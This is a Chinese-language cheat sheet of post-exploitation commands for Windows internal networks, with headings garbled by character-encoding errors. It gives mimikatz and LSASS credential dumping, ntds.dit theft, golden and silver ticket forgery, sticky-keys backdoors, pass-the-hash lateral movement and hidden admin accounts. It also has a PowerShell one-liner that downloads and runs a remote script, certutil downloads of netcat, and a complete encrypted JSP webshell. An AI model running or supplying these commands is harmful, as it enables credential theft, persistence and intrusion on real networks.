# å†…ç½‘å¸¸ç”¨å‘½ä»¤

## Windows

### Win-å‡­è¯è·å–

ğŸš€  
mimikatz.exe "log hash.txt" "privilege::debug" "sekurlsa::logonPasswords" "exit"  
mimikatz.exe "log hash.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"

ğŸš€ åˆ©ç”¨å…·æœ‰å¾®è½¯ç­¾åçš„DumpMinitool.exeå·¥å…·å¯¼å‡ºå†…å­˜  
--file ä¿å­˜çš„æ–‡ä»¶å  
--processId lsass.exe è¿›ç¨‹å·  
DumpMinitool.exe --file dump.txt --processId 948 --dumpType Full

ğŸš€è·å–ç³»ç»Ÿä¿å­˜çš„RDPå¯†ç   
æŸ¥è¯¢è¿œç¨‹è¿æ¥è®°å½•  
reg query "HKEY\_CURRENT\_USER\\Software\\Microsoft\\Terminal Server Client\\Servers" /s  
è§£å¯†å‡ºæ˜æ–‡RDPè¿æ¥å¯†ç , mimikatzæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:  
privilege::debug  
dpapi::cred /in:{å‡­è¯æ–‡ä»¶}  
sekurlsa::dpapi  
dpapi::cred /in:{å‡­è¯æ–‡ä»¶} /masterkey:{MasterKey}  
exit

ğŸš€è·å–ç³»ç»Ÿä¿å­˜çš„VPNå¯†ç   
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

ğŸš€è·å–ç³»ç»Ÿè¿æ¥çš„WIFIå¯†ç   
for /f "skip\=9 tokens\=1,2 delims\=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key\=clear

ğŸš€å·å½±æ‹·è´è·å–åŸŸæ§å‡­è¯, æ­¤æ–¹æ³•æ”¯æŒwindows server 2003ã€2008ã€2012  
ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºå¿«ç…§ äº§ç”Ÿçš„å¿«ç…§GUIDä¸ºï¼š{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}  
ntdsutil.exe snapshot "activate instance ntds" create quit quit  
ç¬¬äºŒæ­¥ï¼šåŠ è½½å¿«ç…§ å¿«ç…§ä½ç½®ï¼šC:\$SNAP\_202009222211\_VOLUMEC\$\\  
ntdsutil.exe snapshot "mount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" quit quit  
ç¬¬ä¸‰æ­¥ï¼šå¤åˆ¶å¿«ç…§ä¸­çš„ntds.ditæ–‡ä»¶  
copy 'C:\$SNAP\_202009222211\_VOLUMEC\$\\Windows\\NTDS\\ntds.dit' C:\\ntds.dit  
ç¬¬å››æ­¥ï¼šåˆ é™¤å¿«ç…§  
ntdsutil.exe snapshot "List All" quit quit  
ntdsutil.exe snapshot "umount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" "delete {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" quit quit  
ntdsutil.exe snapshot "List All" quit quit

ğŸš€åˆ©ç”¨æ³¨å†Œè¡¨ç¦»çº¿å¯¼å‡ºHash  
reg save HKLM\\SYSTEM system.hiv  
reg save HKLM\\SAM sam.hiv  
reg save HKLM\\security security.hiv

ğŸš€ä½¿ç”¨mimikatzè§£å¯†Hash  
mimikatz.exe "log hash.txt" "lsadump::sam /system:system.hiv /sam:sam.hiv /security security.hiv" exit

ğŸš€åˆ©ç”¨procdumpå¯¼å‡ºå†…å­˜æ–‡ä»¶  
procdump.exe -accepteula -ma lsass.exe lsass.dmp  
ä½¿ç”¨mimikatzæŠ“å–å¯†ç   
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log hash.txt" "sekurlsa::logonPasswords full" "exit"

ğŸš€ç¦»çº¿è·å–ç³»ç»Ÿä¿å­˜çš„RDPå¯†ç   
æŸ¥è¯¢è¿œç¨‹è¿æ¥è®°å½•  
reg query "HKEY\_CURRENT\_USER\\Software\\Microsoft\\Terminal Server Client\\Servers" /s  
ä¸Šä¼ procdumpè·å–å†…å­˜æ–‡ä»¶, procdumpæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:  
procdump.exe -accepteula -ma lsass.exe lsass.dmp  
è§£å¯†å‡ºæ˜æ–‡RDPè¿æ¥å¯†ç , mimikatzæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤:  
privilege::debug  
dpapi::cred /in:{å‡­è¯æ–‡ä»¶}  
sekurlsa::minidump lsass.dmp  
sekurlsa::dpapi  
dpapi::cred /in:{å‡­è¯æ–‡ä»¶} /masterkey:{MasterKey}  
exit

ğŸš€åˆ©ç”¨PowerShellå¯¼å‡ºå†…å­˜  
powershell -c "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {pid} {output} full"  
è·å–ä¿å­˜åˆ°æ³¨å†Œè¡¨ä¸­çš„å¯†ç   
REG query HKCU /v "pwd" /s"

---

### Win-æƒé™ç»´æŒ

ğŸš€  
ç²˜æ»é”®åé—¨  
pushd C:\\windows\\system32  
move sethc.exe sethc.exe.bak  
copy cmd.exe sethc.exe

ğŸš€ å…‹éš†è´¦å·  
å°†ä¸€ä¸ªè´¦å·å½“å‰çš„æƒé™ä»¥åŠè´¦å·ç›¸å…³ä¿¡æ¯å…‹éš†åˆ°å¦å¤–ä¸€ä¸ªæ–°è´¦æˆ·ä¸­, å¦‚æœè¢«å…‹éš†è´¦å·è¢«ç¦ç”¨, åˆ™æ— æ³•å…‹éš†  
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Create-Clone.ps1'); Create-Clone -u support -p P@ssw0rd

ğŸš€ ä¼ªé€ é»„é‡‘ç¥¨æ®(ä¼ªé€ TGT)  
ä¼ªé€ æ¡ä»¶ï¼šéœ€è¦ä¼ªé€ çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·åã€å®Œæ•´çš„åŸŸåã€åŸŸSIDã€krbtgtçš„NTLM Hashæˆ–AES-256å€¼  
æ³¨æ„äº‹é¡¹ï¼šä¼ªé€ ç”¨æˆ·å¯ä»¥æ˜¯ä»»æ„ç”¨æˆ·ï¼ˆTGTçš„åŠ å¯†æ˜¯ç”±krbtgtå®Œæˆçš„ï¼Œåªè¦TGTè¢«krbtgtè´¦æˆ·å¯†ç æ­£ç¡®åŠ å¯†ï¼Œé‚£ä¹ˆä»»æ„KDCä½¿ç”¨krbtgtè§£å¯†TGTä¸­çš„ä¿¡æ¯ä¹Ÿæ˜¯å¯ä¿¡çš„ï¼‰  
è·å–ç®¡ç†å‘˜è´¦å·  
net group "domain admins" /domain  
è·å–åŸŸå  
ipconfig /all  
è·å–åŸŸSID  
wmic useraccount get name,sid //è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·sid  
whomai /user //è·å–å½“å‰ç”¨æˆ·sid  
å¯¼å‡ºkrbtgtçš„ntml hash (ä½¿ç”¨mimikatzå·¥å…·çš„dcsyscåŠŸèƒ½è¿œç¨‹è½¬å‚¨æ´»åŠ¨ç›®å½•çš„ntds.ditå¹¶å¯¼å‡ºkrbtgtè´¦å·ä¿¡æ¯)  
minikatz.exe "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit  
æ¸…ç©ºç¥¨æ® mimikatzä¸­è¾“å…¥å¦‚ä¸‹å‘½ä»¤  
kerberos::purge æˆ–è€… klist purge  
ç”Ÿæˆç¥¨æ®  
kerberos::golden /admin:administrator /domain:test.com /sid:S-1-5-21-593020204-2933201490-533286667 /krbtgt:8894a0f0182bff68e84bd7ba767ac8ed /ticket:golden.kiribi  
ä¼ é€’ç¥¨æ®å¹¶æ³¨å…¥(å¦‚æœä¸Šä¸€æ­¥ç”¨çš„/pttå‚æ•°å°±è·³è¿‡è¿™ä¸€æ­¥)  
Kerberos::ptt golden.kiribi  
æŸ¥çœ‹å½“å‰ä¼šè¯ä¸­çš„ç¥¨æ®  
Kerberos::tgt  
éªŒè¯æƒé™  
dir \\dc\\c\$

ğŸš€ ä¼ªé€ ç™½é“¶ç¥¨æ®(ä¼ªé€ TGS)  
ä¼ªé€ æ¡ä»¶ï¼šåŸŸåã€åŸŸSIDã€éœ€è¦ä¼ªé€ çš„ç”¨æˆ·åã€ç›®æ ‡æœåŠ¡å™¨çš„FQDN(Fully Qualified Domain Name) //å…¨é™å®šåŸŸåï¼šåŒæ—¶å¸¦æœ‰ä¸»æœºåå’ŒåŸŸåçš„åç§°ã€å¯åˆ©ç”¨çš„æœåŠ¡ã€æœåŠ¡è´¦å·çš„NTML Hash  
æ³¨æ„äº‹é¡¹ï¼šç¥¨æ®20åˆ†é’Ÿå†…æœ‰æ•ˆï¼Œè¿‡æœŸä¹‹åå¯ä»¥å†æ¬¡å¯¼å…¥ã€é“¶ç¥¨æ˜¯ä¼ªé€ çš„TGSï¼Œæ‰€ä»¥æ²¡æœ‰ä¸åŸŸæ§åˆ¶å™¨é€šä¿¡ã€ç™½é“¶ç¥¨æ®ä»…é™äºç‰¹å®šæœåŠ¡å™¨ä¸Šçš„ä»»ä½•æœåŠ¡ã€äº§ç”Ÿä»»ä½•äº‹ä»¶æ—¥å¿—éƒ½åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Š  
è·å–åŸŸå  
ipconfig /all  
è·å–åŸŸSID  
wmic useraccount get name,sid //è·å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·sid  
whomai /user //è·å–å½“å‰ç”¨æˆ·sid  
è·å–æœåŠ¡è´¦å·çš„NTML Hash  
Mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit // éœ€è¦ç®¡ç†å‘˜æƒé™  
æ¸…ç©ºç¥¨æ® mimikatzä¸­è¾“å…¥å¦‚ä¸‹å‘½ä»¤  
kerberos::purge  
ç”Ÿæˆç¥¨æ®  
mimikatz "kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt" exit  
ç™½é“¶ç¥¨æ®éœ€è¦çš„å‚æ•°:  
/target: ç›®æ ‡æœåŠ¡å™¨çš„FQDNï¼š(Fully Qualified Domain Name)å…¨é™å®šåŸŸåï¼šåŒæ—¶å¸¦æœ‰ä¸»æœºåå’ŒåŸŸåçš„åç§°ã€‚ï¼ˆé€šè¿‡ç¬¦å·"."ï¼‰  
/service: è¿è¡Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„kerberosæœåŠ¡ï¼Œè¯¥æœåŠ¡ä¸»ä½“åç§°ç±»å‹å¦‚cifsï¼Œhttpï¼Œmssqlç­‰  
/rc4: æœåŠ¡çš„NTLMæ•£åˆ—ï¼ˆè®¡ç®—æœºå¸æˆ·æˆ–ç”¨æˆ·å¸æˆ·ï¼‰  
æŸ¥çœ‹å½“å‰ä¼šè¯ä¸­çš„ç¥¨æ®  
Kerberos::tgt  
éªŒè¯æƒé™  
dir \\dc\\c\$

---

### Win-æ¨ªå‘ç§»åŠ¨

ğŸš€  
å¼€å¯UACå, åªæœ‰æœ¬åœ°ç®¡ç†å‘˜ç»„é‡Œçš„è´¦æˆ·èƒ½pthã€‚åŸŸDomain adminé»˜è®¤åœ¨æœ¬åœ°ç®¡ç†å‘˜ç»„  
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f

ğŸš€445ç«¯å£SMBå“ˆå¸Œä¼ é€’  
ä½¿ç”¨impacketå¥—ä»¶çš„psexec.exeå·¥å…·ï¼š  
éœ€è¦å¼€æ”¾445ç«¯å£, æ­¤æ–¹æ³•å·²è¢«æ€è½¯åˆ—å…¥é»‘åå•  
éœ€è¦è¿œç¨‹ç³»ç»Ÿå¼€å¯admin\$å…±äº«ï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰  
åœ¨ä½¿ç”¨PsExecæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¼šåœ¨ç›®æ ‡ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªpsexecæœåŠ¡ã€‚å‘½ä»¤æ‰§è¡Œåï¼ŒpsexecæœåŠ¡å°†è¢«è‡ªåŠ¨åˆ é™¤ã€‚ä½†åˆ›å»ºæˆ–åˆ é™¤æœåŠ¡æ—¶ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—  
-accepteulaï¼šç¬¬ä¸€æ¬¡è¿è¡ŒPsExecä¼šå¼¹å‡ºç¡®è®¤æ¡†ï¼Œä½¿ç”¨è¯¥å‚æ•°å°±ä¸ä¼šå¼¹å‡ºç¡®è®¤æ¡†  
-sï¼šä»¥systemæƒé™è¿è¡Œè¿œç¨‹è¿›ç¨‹ï¼Œè·å¾—ä¸€ä¸ªsystemæƒé™çš„äº¤äº’å¼shellã€‚å¦‚æœä¸ä½¿ç”¨è¯¥å‚æ•°ï¼Œä¼šè·å¾—ä¸€ä¸ªadministratoræƒé™çš„shellã€‚  
psexec.exe /accepteula /s \\127.0.0.1 -u cloud/administrator -p P@ssw0rd -s cmd

ğŸš€ä½¿ç”¨impacketå¥—ä»¶çš„mmcexecå·¥å…·ï¼š  
mmcexec.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

ğŸš€ä½¿ç”¨impacketå¥—ä»¶çš„smbclientå·¥å…·ï¼š  
smbclient.exe cloud/administrator:P@ssw0rd@127.0.0.1  
smbclient.exe -hashes e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

ğŸš€135ç«¯å£WMIå“ˆå¸Œä¼ é€’  
ä½¿ç”¨impacketå¥—ä»¶çš„wmiexecå·¥å…·ï¼š  
åœ¨ä½¿ç”¨wmiexecè¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ï¼ŒWindowsæ“ä½œç³»ç»Ÿé»˜è®¤ä¸ä¼šäº§ç”Ÿæ—¥å¿—ï¼Œæ­¤æ–¹æ³•æ¯”PsExecéšè”½æ€§è¦æ›´å¥½ä¸€äº›  
wmiexec.exe cloud/administrator:P@ssw0rd@127.0.0.1  
wmiexec.exe -hashes :e10adc3949ba59abbe56e057f20f883e cloud/administrator@127.0.0.1

ğŸš€æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºè¿›ç¨‹  
tasklist /S 192.168.31.17 /U domain\\administrator /P /V

---

### Win-è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯

ğŸš€  
æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å’Œè¡¥ä¸ä¿¡æ¯: systeminfo  
è¯†åˆ«æ“ä½œç³»ç»Ÿåç§°åŠç‰ˆæœ¬ï¼ˆè‹±æ–‡ï¼‰: systeminfo | findstr /B /C:"OS Name" /c:"OS Version"  
è¯†åˆ«æ“ä½œç³»ç»Ÿåç§°åŠç‰ˆæœ¬ï¼ˆä¸­æ–‡ï¼‰: systeminfo | findstr /B /C:"OS åç§°" /C:"OS ç‰ˆæœ¬"  
è¯†åˆ«ç³»ç»Ÿä½“ç³»ç»“æ„: echo %PROCESSOR_ARCHITECTURE% AMD64

---

### Win-è·å–ç”¨æˆ·ä¿¡æ¯

ğŸš€  
æŸ¥çœ‹å½“å‰ç”¨æˆ·: whoami  
æŸ¥çœ‹è®¡ç®—æœºç”¨æˆ·åˆ—è¡¨: net user  
æŸ¥çœ‹è®¡ç®—æœºç”¨æˆ·ç»„åˆ—è¡¨: net localgroup  
æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·: query user  
æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¿å­˜çš„å‡­è¯: cmdkey /list  
æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¿å­˜çš„ç¥¨æ®å‡­è¯: klist

---

### Win-è·å–ç½‘ç»œä¿¡æ¯

ğŸš€  
æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ : route print  
æŸ¥çœ‹arp : arp -A  
æŸ¥çœ‹ipåœ°å€å’Œdnsä¿¡æ¯: ipconfig /all  
æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™: netsh firewall show config  
æŸ¥çœ‹å½“å‰é˜²ç«å¢™çŠ¶æ€: netsh firewall show state  
æŸ¥çœ‹ç³»ç»Ÿå¼€æ”¾ç«¯å£: netstat -ano

---

### Win-è·å–åº”ç”¨ç¨‹åºåŠæœåŠ¡ä¿¡æ¯

ğŸš€  
æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡: schtasks /query /fo LIST /v  
æŸ¥çœ‹å®‰è£…é©±åŠ¨: driverquery  
æŸ¥çœ‹å®‰è£…ç¨‹åºå’Œç‰ˆæœ¬ä¿¡æ¯: wmic product list brief  
æŸ¥çœ‹æœåŠ¡: wmic service list brief  
æŸ¥çœ‹è¿›ç¨‹: wmic process list brief  
æ ¹æ®è¿›ç¨‹æŸ¥æ‰¾è¿›ç¨‹æ–‡ä»¶: wmic process where name\="xxxx.exe" get processid,executablepath,name  
wmic process where name\="chrome.exe" list full  
æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯: wmic startup list brief  
æŸ¥çœ‹3389ç«¯å£: for /f "tokens\=2" %i in ('tasklist /FI "SERVICES eq TermService" /NH') do netstat -ano | findstr %i | findstr LISTENING  
Winè®¾ç½®ç»ˆç«¯ä»£ç†: set http\_proxy\=http://127.0.0.1:7890 & set https\_proxy\=http://127.0.0.1:7890  
æŸ¥çœ‹.msiç¨‹åºçš„æ‰§è¡Œæƒé™: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v  
AlwaysInstallElevated  
æŸ¥çœ‹æ˜¯å¦è®¾ç½®setuidã€setgid: reg HKEY\_Local\_Machine\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits  
æŸ¥çœ‹å®‰è£…è¡¥ä¸å’Œæ—¶é—´ä¿¡æ¯: wmic qfe get Caption,Description,HotFixID,InstalledOn  
æŸ¥çœ‹ç‰¹å®šæ¼æ´è¡¥ä¸ä¿¡æ¯: wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KBxxxxxxxx"  
æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹: tasklist /svc  
åˆ—å‡ºè¯¦ç»†è¿›ç¨‹: tasklist /V /FO CSV

---

### Win-è·å–æ•æ„Ÿæ•°æ®å’Œç›®å½•

ğŸš€  
æœç´¢Dç›˜ç£ç›˜åå­—ä¸ºlogo.jpgçš„æ–‡ä»¶: cd /d D:\\ && dir /b /s logo.jpg  
æœç´ Cç›˜æ–‡ä»¶å¤¹ä¸‹åç¼€confå†…å®¹æœ‰password: findstr /s /i /n /d:C:\\ "password" .confæŸ¥æ‰¾å¯†ç æ–‡ä»¶æˆ–å…¶ä»–æ•æ„Ÿæ–‡ä»¶: dir /b/s password.txt dir /b/s .doc dir /b/s .ppt dir /b/s .xls dir /b/s .docx dir /b/s .xlsx dir /b/s config. findstr /si password .xml .ini .txt findstr /si  
login .xml .ini .txt  
æŸ¥çœ‹æ— äººå€¼å®ˆå®‰è£…æ–‡ä»¶ï¼Œæ–‡ä»¶ä½ç½®å¦‚ä¸‹: C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend\\Unattended.xml C:\\Windows\\Panther\\Unattended.xml

---

### Win-æ·»åŠ ç”¨æˆ·

ğŸš€  
æ·»åŠ ç”¨æˆ·å¹¶è®¾ç½®å¯†ç : net user mstlab tools /add  
å°†ç”¨æˆ·åŠ å…¥ç®¡ç†ç»„: net localgroup administrators tools /add  
å°†ç”¨æˆ·åŠ å…¥æ¡Œé¢ç»„: net localgroup "Remote Desktop Users" tools /add  
æ¿€æ´»guestç”¨æˆ·: net user guest /active:yes  
æ›´æ”¹guestç”¨æˆ·çš„å¯†ç : net user guest 123456  
å°†guestç”¨æˆ·åŠ å…¥ç®¡ç†ç»„: net localgoup administrators guest /add

---

### Win-æ³¨å†Œè¡¨ç›¸å…³

ğŸš€  
æŸ¥çœ‹3389ç«¯å£: REG query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber  
å¼€å¯è¿œç¨‹æ¡Œé¢: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal" "Server /v fDenyTSConnections /t REG\_DWORD /d 0 /f  
æ³¨å†Œè¡¨æŠ“å–æ˜æ–‡: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f  
rdpè¿æ¥é»˜è®¤çš„10ä¸ªè®°å½•: reg query "HKEY\_CURRENT\_USER\\Software\\Microsoft\\Terminal Server Client\\Default"  
rdpè¿æ¥é»˜è®¤çš„æ‰€æœ‰è®°å½•: reg query "HKEY\_CURRENT\_USER\\Software\\Microsoft\\Terminal Server Client\\Servers" /s  
æŸ¥æ‰¾è½¯ä»¶å®‰è£…ç›®å½•: reg query HKLM /f foxmail /t REG\_SZ /s

---

### Win-mimikatzæŸ¥çœ‹å½“å‰å¯†ç 

ğŸš€  
mimikatzæŸ¥çœ‹å½“å‰å¯†ç : mimikatz "log" "privilege:debug" "sekurlsa:logonpasswords" "exit"  
mimikatzæŠ“å–domainå¯†ç : mimikatz "lsadump::dcsync /domain:test.com /all /csv" "exit"  
regå¯¼å‡ºæ³¨å†Œè¡¨hash: reg save hklm\\sam c:\\programdata\\sam.hive && reg save hklm\\system c:\\programdata\\system.hive  
mimikatzè¯»å–æ³¨å†Œè¡¨å¯¼å‡ºçš„hashä¿¡æ¯: mimikatz "log" "lsadump::sam /sam:sam.hive /system:system.hive" "exit"  
impacketåŒ…çš„secretsdump: secretsdump.exe -sam sam.hive -system system.hive LOCAL  
nmapæ‰«ææ°¸æ’ä¹‹è“æ¼æ´: nmap -p445 --script smb-vuln-ms17-010 127.0.0.1  
meterpreteræŠŠç›®æ ‡çš„3389ç«¯å£è½¬å‘åˆ°vpsçš„6666ç«¯å£: portfwd add -l 6666 -p 3389 -r 127.0.0.1  
attribåˆ›å»ºéšè—æ–‡ä»¶: attrib +s +h +r \*.exe  
.neté™é»˜å®‰è£…: dotNetFx40\_Full\_x86\_x64.exe /q /norestart /ChainingPackage FullX64Bootstrapper  
lcxç«¯å£è½¬å‘: æœ¬åœ°ç›‘å¬: lcx.exe -listen 110 34567ç›®æ ‡æ‰§è¡Œ: lcx.exe -slave vpsip 110 127.0.0.1 3389  
æ‰«æweb.txtæ–‡ä»¶çš„ç½‘ç«™æ ‡é¢˜: æœ¬åœ°ç›‘å¬: whatweb -i web.txt -p Title whatweb  
Winç»ˆç«¯è®¾ç½®ä»£ç†: æœ¬åœ°ç›‘å¬: set http\_proxy\=socks5://127.0.0.1:1080 && set https\_proxy\=socks5://127.0.0.1:1080  
xfreerdp hashè¿æ¥rdp: xfreerdp /u:administrator /pth:ccef208c6485269c20db2cad21734fe7 /v:10.20.24.100 /cert-ignore //server 2012  
runasè¿è¡Œå…¶å®ƒè´¦æˆ·æƒé™çš„ç¨‹åº: runas /user:hostname\\username /sa "cmd.exe"

---

### Win-ç³»ç»Ÿä¸‹è½½æ–‡ä»¶

certutilä¸‹è½½æ–‡ä»¶: certutil -urlcache -split -f http://192.168.5.21:888/nc.txt c:\nc.txt  
certutilåˆ é™¤è®°å½•: certutil -urlcache -split -f http://192.168.1.115/robots.txt delete  
bitsadminä¸‹è½½æ–‡ä»¶: bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\Pstools.zip

esentutl.exe /y /vss C:\Windows\System32\config\System /d system
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d sam

---

### Win-Wmicå‘½ä»¤

wmicè¿œç¨‹è¿æ¥æœºå™¨: wmic /node:"192.168.1.20" /user:"domain\\administrator" /password:"123456"  
æŸ¥çœ‹ç³»ç»Ÿå®‰è£…è½¯ä»¶: wmic product get name,version  
æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬: wmic OS get Caption,CSDVersion,OSArchitecture,Version  
æ ¹æ®PidæŸ¥æ‰¾è¿›ç¨‹è·¯å¾„: wmic process get name,executablepath,processid|findstr pid  
æŸ¥çœ‹ç£ç›˜ä¿¡æ¯: Wmic logicaldisk  
æŸ¥çœ‹ç»„ã€hostnameç­‰ä¿¡æ¯: wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list  
æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ˜¯å¦æ˜¯VMWARE: wmic bios list full | find /i "vmware"  
æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ˜¯å¦æœ‰å±ä¿åŠå»¶è¿Ÿ: wmic desktop get screensaversecure,screensavertimeout

---

### Win-Mssqlç¯å¢ƒ

mssqlå¼€å¯xp\_cmdshell: EXEC sp\_configure 'show advanced options', 1;RECONFIGURE;EXEC sp\_configure 'xp\_cmdshell', 1;RECONFIGURE;  
mssqlè¾“å‡ºæ–‡ä»¶: exec master..xp\_cmdshell '>>c:\\windows\\temp\\info.txt set /p\="base64\_encode" æŸ¥çœ‹cç›˜ä¸‹web.configæ–‡ä»¶: findstr /c:"User Id\=" /c:"Password\=" /si web.config >> tmps.logs å¸¸è§„å·¥ä½œç»„å†…ç½‘ç¯å¢ƒä¸‹çš„mssqlå®ä¾‹: PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"

---

### Win-å‹ç¼©è§£å‹

7Zå‹ç¼©æ–‡ä»¶  
7z.exe a OutputFile InputFile  
7Zè§£å‹æ–‡ä»¶  
7z.exe x InputFile OutputFile  
RARå‹ç¼©æ–‡ä»¶  
rar.exe a OutputFile InputFile  
RARè§£å‹æ–‡ä»¶  
rar.exe x InputFile OutputFile

---

### Win-æŸ¥æ‰¾æ–‡ä»¶

dir c:\\ /s /b | find "win.ini"  
dir c:\\ /s /b | find "navicat.exe"  
dir c:\\ /s /b | find "finalshell.exe"  
cd /d C:\\ && dir /b /s password.txt  
where /R C:\\ password.txt

---

### Win-å†™æ–‡ä»¶

echo \^<%@page import\="java.util.,javax.crypto.,javax.crypto.spec.\*"%\^> >> C:/x/x.jsp

echo \^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\^> >> C:/x/x.jsp

echo \^<%if (request.getMethod().equals("POST")){String k\="e45e329feb5d925b";session.putValue("u",k);Cipher c\=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\^> >> C:/x/x.jsp

---

### Win-æ˜¾ç¤ºæ›¾è¿æ¥çš„æ— çº¿å¯†ç 

netsh wlan show profiles  
for /f "skip\=9 tokens\=1,2 delims\=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key\=clear

---

### Win-å¸¸ç”¨ç³»ç»Ÿå˜é‡

æŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•%HOMEPATH  
æŸ¥çœ‹å½“å‰ç›®å½•%CD%  
åˆ—å‡ºç”¨æˆ·å…±äº«ä¸»ç›®å½•çš„ç½‘ç»œè·¯å¾„%HOMESHARE%  
åˆ—å‡ºæœ‰æ•ˆçš„å½“å‰ç™»å½•ä¼šè¯çš„åŸŸåæ§åˆ¶å™¨å  
åˆ—å‡ºäº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„%Path%  
åˆ—å‡ºäº†å¤„ç†å™¨çš„èŠ¯ç‰‡æ¶æ„%PROCESSOR\_ARCHITECTURE%  
åˆ—å‡ºäº†Program Filesæ–‡ä»¶å¤¹çš„è·¯å¾„%ProgramFiles%  
åˆ—å‡ºäº†å½“å‰ç™»å½•çš„ç”¨æˆ·å¯ç”¨åº”ç”¨ç¨‹åºçš„é»˜è®¤ä¸´æ—¶ç›®å½•%TEMP% and %TMP%  
åˆ—å‡ºäº†å½“å‰ç™»å½•çš„ç”¨æˆ·å¯ç”¨åº”ç”¨ç¨‹åºçš„é»˜è®¤ä¸´æ—¶ç›®å½•%TEMP% and %TMP%  
åˆ—å‡ºäº†åŒ…å«ç”¨æˆ·å¸å·çš„åŸŸçš„åå­—%USERDOMAIN%  
åˆ—å‡ºæ“ä½œç³»ç»Ÿç›®å½•çš„ä½ç½®%WINDIR%  
è¿”å›â€œæ‰€æœ‰ç”¨æˆ·â€é…ç½®æ–‡ä»¶çš„ä½ç½®%ALLUSERSPROFILE%  
è¿”å›å¤„ç†å™¨æ•°ç›®%NUMBER\_OF\_PROCESSORS%  
powershellåœ°å€%PSModulePath%

---

### Win-ç½‘ç»œPingæ¢æµ‹

for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i "ttl"  
for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i "ttl">>"c:\\a.txt"  
for /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i "ttl"

---

### Win-æ¢æµ‹æ˜¯å¦å‡ºç½‘

certutil -urlcache -split -f http://test.abc.net  
powershell Invoke-WebRequest "http://test.abc.net/"

---

### Win-Win2008å¼€å¯3389

wmic /namespace:\\root\\cimv2\\terminalservices path win32\_terminalservicesetting where (\_\_CLASS !\= "") call setallowtsconnections 1  
wmic /namespace:\\root\\cimv2\\terminalservices path win32\_tsgeneralsetting where (TerminalName \='RDP-Tcp') call setuserauthenticationrequired 1  
